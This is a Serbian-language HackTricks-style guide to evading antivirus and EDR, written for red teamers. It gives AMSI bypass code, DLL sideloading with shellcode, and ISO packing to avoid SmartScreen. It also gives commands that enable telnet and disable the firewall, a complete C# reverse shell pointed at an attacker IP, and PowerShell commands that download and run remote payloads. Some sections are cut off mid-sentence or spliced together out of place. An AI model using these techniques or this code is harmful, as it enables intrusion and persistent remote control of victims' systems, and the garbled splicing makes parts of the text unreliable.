# Antivirus (AV) Bypass

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodičnu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Ovu stranicu je napisao** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologija za izbegavanje AV-a**

Trenutno, AV koristi različite metode za proveru da li je fajl zlonameran ili ne, statičku detekciju, dinamičku analizu, a za naprednije EDR-ove, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih nizova ili nizova bajtova u binarnom ili skript fajlu, kao i izvlačenjem informacija iz samog fajla (npr. opis fajla, naziv kompanije, digitalni potpisi, ikona, kontrolna suma, itd.). To znači da korišćenje poznatih javnih alata može dovesti do bržeg otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoje nekoliko načina za zaobilaženje ovakve vrste detekcije:

* **Enkripcija**

Ako enkriptujete binarni fajl, AV neće moći da otkrije vaš program, ali će vam biti potreban neki vrsta loadera da dekriptuje i pokrene program u memoriji.

* **Obfuskacija**

Ponekad je dovoljno promeniti neke nizove u vašem binarnom fajlu ili skriptu da prođe pored AV-a, ali ovo može biti vremenski zahtevan zadatak u zavisnosti od toga šta pokušavate da obfuskirate.

* **Prilagođeni alati**

Ako razvijate svoje alate, neće biti poznatih loših potpisa, ali je potrebno dosta vremena i truda.

{% hint style="info" %}
Dobar način za proveru protiv statičke detekcije Windows Defender-a je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Osnovna ideja je da fajl podeli na više segmenata i zatim zadatku Defenderu da skenira svaki segment pojedinačno, na ovaj način, može vam reći tačno koji su označeni nizovi ili bajtovi u vašem binarnom fajlu.
{% endhint %}

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza je kada AV pokreće vaš binarni fajl u pesku i posmatra zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki vašeg pregledača, izvođenje minidump-a na LSASS-u, itd.). Ovaj deo može biti malo složeniji za rad, ali evo nekoliko stvari koje možete uraditi da izbegnete pesak.

* **Pauza pre izvršenja** U zavisnosti od toga kako je implementirano, može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ovi imaju veoma kratak vremenski period za skeniranje fajlova kako ne bi prekinuli rad korisnika, pa korišćenje dugih pauza može poremetiti analizu binarnih fajlova. Problem je što mnogi AV peskovi mogu preskočiti pauzu u zavisnosti od toga kako je implementirana.
* **Provera resursa mašine** Obično peskovi imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), inače bi mogli usporiti rad korisnikove mašine. Možete biti veoma kreativni ovde, na primer proverom temperature CPU-a ili čak brzinom ventilatora, neće sve biti implementirano u pesku.
* **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara da vidite da li se poklapa sa onim koji ste naveli, ako se ne poklapa, možete naterati vaš program da se zatvori.

Ispostavlja se da je ime računara Microsoft Defender peska HAL9TH, tako da možete proveriti ime računara u vašem malveru pre detekcije, ako ime odgovara HAL9TH, to znači da ste unutar Defenderovog peska, pa možete naterati vaš program da se zatvori.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Neki drugi veoma korisni saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv peskova

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **javni alati** će na kraju **biti otkriveni**, pa se trebate zapitati nešto:

Na primer, ako želite da izvršite dump LSASS-a, **da li zaista morate koristiti mimikatz**? Ili možete koristiti drugi projekat koji je manje poznat i takođe vrši dump LSASS-a.

Pravi odgovor je verovatno ovaj drugi. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih malvera od strane AV-a i EDR-a, dok je sam projekat super kul, takođe je noćna mora raditi sa njim da bi se izbegli AV-i, pa potražite alternative za ono što pokušavate postići.

{% hint style="info" %}
Kada modifikujete svoje payload-e za izbegavanje, obavezno **isključite automatsko slanje uzoraka** u defenderu, i molim vas, ozbiljno, **NE POSTAVLJAJTE NA VIRUSTOTAL** ako je vaš cilj postići izbegavanje na duže staze. Ako želite da proverite da li vaš payload biva otkriven određenim AV-om, instalirajte ga na virtuelnu mašinu, pokušajte da isključite automatsko slanje uzoraka, i testirajte ga tamo dok ne budete zadovoljni rezultatom.
{% endhint %}

## EXE vs DLL

Uvek **prioritet dajte korišćenju DLL fajlova za izbegavanje**, prema mom iskustvu, DLL fajlovi su obično **mnogo manje otkriveni** i analizirani, pa je to veoma jednostavan trik koji možete koristiti kako biste izbegli otkrivanje u nekim slučajevima (ako vaš payload ima način pokretanja kao DLL naravno).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima stopu otkrivanja od 4/26 na antiscan.me, dok EXE payload ima stopu otkrivanja od 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a i normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo prikazati neke trikove koje možete koristiti sa DLL fajlovima kako biste bili mnogo neprimetniji.

## DLL Učitavanje sa Strane & Proxying

**DLL Učitavanje sa Strane** iskorišćava redosled pretrage DLL fajlova koji se koristi od strane učitavača tako što postavlja žrtvenu aplikaciju i zlonamerni sadržaj jedan pored drugog.

Možete proveriti programe koji su podložni DLL Učitavanju sa Strane koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Ova komanda će izlistati programe koji su podložni DLL preusmeravanju unutar "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **istražite programe podložne DLL preusmeravanju/sideloadovanju sami**, ova tehnika je prilično neprimetna kada se pravilno primeni, ali ako koristite javno poznate programe podložne DLL sideloadovanju, možete lako biti otkriveni.

Samo postavljanje zlonamernog DLL fajla sa imenom koje program očekuje da učita, neće učitati vašu payload, jer program očekuje određene funkcije unutar tog DLL fajla. Da bismo rešili ovaj problem, koristićemo još jednu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program vrši sa proxy (i zlonamernog) DLL-a originalnom DLL-u, čime se očuva funkcionalnost programa i omogućava izvršavanje vaše payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Slede koraci koje sam pratio:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Poslednja komanda će nam dati 2 datoteke: predložak izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Evo rezultata:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu otkrivanja 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Toplo preporučujem** da pogledate [S3cur3Th1sSh1t-ov twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u i takođe [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG\_WNpE) kako biste saznali više o onome o čemu smo detaljnije diskutovali.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za payload za zaobilaženje EDR-ova korišćenjem suspendovanih procesa, direktnih sistemskih poziva i alternativnih metoda izvršavanja`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Izbegavanje je samo igra mačke i miša, ono što danas funkcioniše može biti otkriveno sutra, stoga se nikada ne oslanjajte samo na jedan alat, ako je moguće, pokušajte povezati više tehnika izbegavanja.
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran kako bi sprečio "[malver bez datoteka](https://en.wikipedia.org/wiki/Fileless\_malware)". Prvobitno, AV programi su bili sposobni da skeniraju **datoteke na disku**, pa ako biste na neki način mogli da izvršite payload-e **direktno u memoriji**, AV ne bi mogao ništa da uradi da to spreči, jer nije imao dovoljno vidljivosti.

Funkcija AMSI je integrisana u ove komponente Windows-a.

* Kontrola korisničkog naloga, ili UAC (elevacija EXE, COM, MSI, ili ActiveX instalacija)
* PowerShell (skripte, interaktivna upotreba, i dinamička evaluacija koda)
* Windows Script Host (wscript.exe i cscript.exe)
* JavaScript i VBScript
* Office VBA makroi

To omogućava antivirusnim rešenjima da inspiciraju ponašanje skripti izlažući sadržaj skripti u obliku koji je nešifrovan i nezamagljen.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeće upozorenje na Windows Defender-u.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Primetite kako dodaje `amsi:` i zatim putanju izvršne datoteke iz koje je skripta pokrenuta, u ovom slučaju, powershell.exe

Nismo spustili nikakvu datoteku na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI.

Postoje nekoliko načina za zaobići AMSI:

* **Obfuskacija**

Pošto AMSI uglavnom radi sa statičkim detekcijama, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima sposobnost deobfuskacije skripti čak i ako ima više slojeva, tako da obfuskacija može biti loša opcija u zavisnosti od toga kako je urađena. To čini da izbegavanje nije tako jednostavno. Iako, ponekad, sve što treba da uradite je promeniti par imena promenljivih i bićete u redu, tako da zavisi koliko je nešto označeno.

* **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershella (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i ako se pokreće kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI, istraživači su pronašli više načina za izbegavanje skeniranja AMSI.

**Prisiljavanje greške**

Prisiljavanje inicijalizacije AMSI da ne uspe (amsiInitFailed) rezultovaće time da skeniranje neće biti pokrenuto za trenutni proces. Originalno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis kako bi sprečio širu upotrebu.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Sve što je bilo potrebno bilo je jedna linija powershell koda da bi AMSI bio neupotrebljiv za trenutni powershell proces. Naravno, ova linija je označena od strane AMSI-a, pa je potrebna neka modifikacija kako bi se koristila ova tehnika.

Evo modifikovanog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist-a](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```

**Memory Patching**

Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/\_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisničkog unosa) i prepisivanje instrukcija za vraćanje koda za E\_INVALIDARG, na taj način, rezultat stvarnog skeniranja će biti 0, što se tumači kao čist rezultat.

{% hint style="info" %}
Molimo pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.
{% endhint %}

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI sa powershellom, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/#amsi-bypass) i [ovaj repozitorijum](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

Ili ovaj skript koji putem memory patchinga će patchovati svaki novi Powersh

## Obfuscation

Postoji nekoliko alata koji se mogu koristiti za **obfuskaciju C# čistog koda**, generisanje **metaprogramskih šablona** za kompilaciju binarnih fajlova ili **obfuskaciju kompilovanih binarnih fajlova** kao što su:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskator**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je pružanje open-source verzije [LLVM](http://www.llvm.org/) kompilacionog paketa koji može obezbediti povećanu sigurnost softvera putem [obfuskacije koda](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) i zaštite od manipulacije.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik za generisanje, u vreme kompilacije, obfuskovanog koda bez korišćenja bilo kog spoljnog alata i bez modifikacije kompajlera.
* [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ šablonskog metaprogramskog okvira koji će otežati život osobi koja želi da probije aplikaciju.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binarni obfuskator koji može obfuskovati različite pe fajlove uključujući: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan motor za metamorfnu kodnu mašinu za proizvoljne izvršne fajlove.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je okvir za obfuskaciju koda na nivou asemblerskog koda za jezike podržane od strane LLVM-a koristeći ROP (return-oriented programming). ROPfuscator obfuskira program na nivou asemblerskog koda transformišući redovne instrukcije u ROP lance, ometajući našu prirodnu predstavu normalnog kontrolnog toka.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE kripter napisan u Nim-u
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor je sposoban da konvertuje postojeće EXE/DLL u shell kod i zatim ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog izvršavanja.

Microsoft Defender SmartScreen je sigurnosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputacije, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen i time upozoriti i sprečiti krajnjeg korisnika da izvrši fajl (iako fajl i dalje može biti izvršen klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kog je preuzet.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

{% hint style="info" %}
Važno je napomenuti da izvršni fajlovi potpisani sa **pouzdanim** sertifikatom **neće pokrenuti SmartScreen**.
{% endhint %}

Veoma efikasan način da sprečite vaše payload-e da dobiju Mark of The Web je pakovanje u neku vrstu kontejnera poput ISO fajla. Ovo se dešava jer Mark-of-the-Web (MOTW) **ne može** biti primenjen na **ne NTFS** volumene.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegli Mark-of-the-Web.

Primer korišćenja:

```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije zaobilaženja SmartScreen-a pakovanjem payload-a unutar ISO datoteka korišćenjem [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Učitavanje C# binarnih fajlova u memoriju je poznato već neko vreme i i dalje je odličan način za pokretanje alata za post-eksploataciju bez otkrivanja od strane AV.

Pošto će payload biti učitan direktno u memoriju bez dodira sa diskom, moramo se samo brinuti o zakrpi AMSI za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već pružaju mogućnost izvršavanja C# skupova direktno u memoriji, ali postoje različiti načini za to:

* **Fork\&Run**

Uključuje **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog koda za post-eksploataciju u taj novi proces, izvršavanje zlonamernog koda i kada završite, ubijanje novog procesa. Ovaj metod ima svoje prednosti i nedostatke. Prednost metode fork i run je što se izvršavanje dešava **van** našeg implant procesa Beacon. To znači da ako nešto pođe po zlu ili bude otkriveno u našoj akciji post-eksploatacije, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je što postoji **veća šansa** da budete otkriveni od strane **Ponašajnih Detekcija**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Radi se o ubacivanju zlonamernog koda za post-eksploataciju **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i skeniranje od strane AV, ali nedostatak je što ako nešto krene po zlu prilikom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer bi mogao da se sruši.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ako želite da pročitate više o učitavanju C# skupova, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Takođe možete učitati C# skupove **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t-ov video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje Drugih Programskih Jezika

Kako je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti zlonamerni kod koristeći druge jezike omogućavajući kompromitovanoj mašini pristup **interpreter okruženju instaliranom na SMB deljenom resursu napadača**.

Dozvoljavajući pristup Interpreter Binaries i okruženju na SMB deljenom resursu možete **izvršiti proizvoljan kod na ovim jezicima unutar memorije** kompromitovane mašine.

Repozitorijum ukazuje: Defender i dalje skenira skripte ali korišćenjem Go, Java, PHP itd. imamo **veću fleksibilnost za zaobilaženje statičkih potpisa**. Testiranje sa nasumičnim neobfuskiranim skriptovima za obrnutu vezu na ovim jezicima je bilo uspešno.

## Napredne Evasion Tehnike

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je prilično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje sa kojim se suočite imaće svoje prednosti i mane.

Visoko preporučujem da pogledate ovaj razgovor od [@ATTL4S](https://twitter.com/DaniLJ94), da biste dobili uvid u napredne tehnike Evasion-a.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Ovo je takođe još jedan odličan razgovor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion-u u Dubini.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Stare Tehnike**

### **Proverite koje delove Defender pronalazi kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binarnog fajla** dok ne **otkrije koji deo Defender** pronalazi kao zlonameran i podeliti vam to.\
Još jedan alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web ponudom usluge na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Pokreni ga kada se sistem pokrene i pokreni ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (neprimetno) i onemogućite firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (želite binarne preuzimanja, ne instalaciju)

**NA HOSTU**: Izvršite _**winvnc.exe**_ i konfigurišite server:

* Omogućite opciju _Disable TrayIcon_
* Postavite lozinku u _VNC Password_
* Postavite lozinku u _View-Only Password_

Zatim, premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ unutar **žrtve**

#### **Obrnuta veza**

**Napadač** treba da **izvrši unutar** svog **hosta** binarni fajl `vncviewer.exe -listen 5900` kako bi bio **spreman** da uhvati obrnutu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <napadačeva_ip>::5900`

**UPOZORENJE:** Da biste održali prikrivenost, morate izbegavati nekoliko stvari

* Nemojte pokretati `winvnc` ako već radi ili ćete pokrenuti [popup](https://i.imgur.com/1SROTTl.png). proverite da li radi sa `tasklist | findstr winvnc`
* Nemojte pokretati `winvnc` bez `UltraVNC.ini` u istom direktorijumu jer će otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
* Nemojte pokretati `winvnc -h` za pomoć jer ćete pokrenuti [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Unutar GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni defender će vrlo brzo prekinuti proces.**

### Kompajliranje naše sopstvene reverzne ljuske

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prva C# reverzna ljuska

Kompajlirajte je sa:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristi ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```

### C# korišćenjem kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
